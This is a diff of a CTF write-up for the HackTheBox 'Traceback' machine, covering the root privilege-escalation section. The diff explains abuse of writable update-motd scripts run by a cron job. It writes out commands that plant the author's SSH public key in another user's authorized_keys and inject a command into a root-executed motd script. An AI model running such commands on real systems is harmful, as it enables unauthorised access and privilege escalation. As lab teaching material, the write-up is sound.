@@ -58,11 +58,46 @@ Searching for `privilege escalation lua script` on Google brougth me right away 
 ![userflag](/images/traceback/userflag.png)
 
 ## Privilege Escalation for Root
+First, I had no clue how to proceed, so I just inspected the running processes with `ps -aux | grep root` a couple of times to see if I may find some elevated processes to hook on. And yes, there is a `CRON-job` running, which copies every 30 secs the `update-motd`.
 
- echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ/TCL/WRRYaHSKz5lXROlQjWHpY6kH/rdNQgQkZIXmpJb48POZX6ros00pDDB049dcX8OjAh0RJhI+8IfsauBqUpMk8MKfiGa1H2rwIgj3eVE1053CTc00n/HMZ7qi/dtt4JUQzI0Y91DIeEq/YJ3eEIZtsQwQx27hIx1P9gPcvBCeUPoWqPlE/rw9vu13dKyPIc7xM8vppWvZOKPAbaG3hvpE8T3mehRFP48DfIC/99SUuKSoY2eF8ZlsJhBSCi+Q3R1iXrPJP4rU+c8odx/0fbwOPSQBlt/oFbxXSIcwVbxAg5UrgfxveIhptif2r79k1SwC0Cf3a/T1zHNUDvheF3pcDtAQZzva/XKS/i88A4lYIdq63IgKBlZEilT4duxZ+Nxa9JQC+ii+q7nNjuA/aJj5r7seKMgYBPn3ZA3bdO0ZQ1PoT/cXyn4B56ILBheCiVhRpeXRhoYo2esvN2Wwb9AzLhiothDST1s3kshc36qqecdad5RnAB5c08kDLc= faebu@kali >> /home/webadmin/.ssh/authorized_keys
 
-![ssh](/images/traceback/ssh_shell.png)
+![cronjob](/images/traceback/rootprocesses.png)
 
-e9bece3c49a50bf0fb819ee50285085f
+As in http://manpages.ubuntu.com/manpages/bionic/man5/update-motd.5.html explained, `update-motd` is able to execute scripts as root when remote users log in with `ssh` :-) 
+
+```bash
+       UNIX/Linux  system  adminstrators  often  communicate important information to console and
+       remote users by maintaining text  in  the  file  /etc/motd,  which  is  displayed  by  the
+       pam_motd(8) module on interactive shell logins.
+
+       Traditionally,  this file is static text, typically installed by the distribution and only
+       updated on release upgrades, or overwritten by  the  local  administrator  with  pertinent
+       information.
+
+       Ubuntu introduced the update-motd framework, by which the motd(5) is dynamically assembled
+       from a collection of scripts at login.
+
+       Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at
+       each  login,  and  this  information  is  concatenated in /run/motd.dynamic.  The order of
+       script  execution  is  determined  by  the  run-parts(8)  --lsbsysinit  option  (basically
+       alphabetical order, with a few caveats).
+
+       On Ubuntu systems, /etc/motd is typically a symbolic link to /run/motd.dynamic.
+```
+And best of all, the by the `CRON-Job` copied files in `/etc/update-motd.d` where writeable to the user `sysadmin`.
+
+![updatemotd](/images/traceback/updatemotd.png)
+
+So all I had to do now were the following three steps
+
+```bash
+1.  echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ/TCL/WRRYaHSKz5lXROlQjWHpY6kH/rdNQgQkZIXmpJb48POZX6ros00pDDB049dcX8OjAh0RJhI+8IfsauBqUpMk8MKfiGa1H2rwIgj3eVE1053CTc00n/HMZ7qi/dtt4JUQzI0Y91DIeEq/YJ3eEIZtsQwQx27hIx1P9gPcvBCeUPoWqPlE/rw9vu13dKyPIc7xM8vppWvZOKPAbaG3hvpE8T3mehRFP48DfIC/99SUuKSoY2eF8ZlsJhBSCi+Q3R1iXrPJP4rU+c8odx/0fbwOPSQBlt/oFbxXSIcwVbxAg5UrgfxveIhptif2r79k1SwC0Cf3a/T1zHNUDvheF3pcDtAQZzva/XKS/i88A4lYIdq63IgKBlZEilT4duxZ+Nxa9JQC+ii+q7nNjuA/aJj5r7seKMgYBPn3ZA3bdO0ZQ1PoT/cXyn4B56ILBheCiVhRpeXRhoYo2esvN2Wwb9AzLhiothDST1s3kshc36qqecdad5RnAB5c08kDLc= faebu@kali >> /home/webadmin/.ssh/authorized_keys #authorize my public key for the user webadmin to login later with ssh
+
+2. echo "cat /root/root.txt" >> 00-header #as user sysadmin to prepare the payload. 00-header will be executed once we log in with ssh
+
+3. #log in with ssh to grab the root-flag
+```
 
 ![root](/images/traceback/rootflag.png)
+
+## Conclusion
